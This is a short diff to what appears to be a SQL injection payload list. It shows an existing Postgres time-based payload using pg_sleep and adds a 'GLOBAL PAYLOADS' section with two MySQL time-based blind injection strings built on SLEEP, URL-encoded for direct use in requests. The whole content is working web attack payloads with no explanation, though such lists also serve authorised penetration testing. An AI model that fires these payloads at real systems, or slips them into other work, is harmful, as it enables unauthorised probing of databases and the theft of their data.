@@ -117,3 +117,8 @@ latest:
 
 POSTGRES SQLI PAYLOAD
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+
+##### GLOBAL PAYLOADS #####
+'+AND+(SELECT+2111+FROM+(SELECT(SLEEP(5)))AbKz)+AND+'jpmA'='jpmA
+'XOR(select*from(select(sleep(7)))a)XOR'Z--%20-+
